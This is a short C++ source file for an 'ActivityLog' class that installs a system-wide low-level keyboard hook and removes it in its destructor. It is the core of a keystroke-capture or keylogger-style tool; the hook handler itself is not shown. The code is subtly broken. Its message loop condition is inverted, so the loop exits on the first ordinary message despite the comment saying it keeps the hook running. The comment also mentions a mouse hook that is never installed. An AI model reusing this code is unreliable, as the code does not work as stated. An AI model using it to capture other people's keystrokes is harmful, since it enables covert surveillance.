#include "ActivityLog.h"


ActivityLog::ActivityLog()
{
	KeyboardLog log;
	// Install the low-level keyboard & mouse hooks
	hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, log.LowLevelKeyboardProc, 0, 0);

	// Keep this app running until we're told to stop
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
}


ActivityLog::~ActivityLog()
{
	UnhookWindowsHookEx(hhkLowLevelKybd);
}
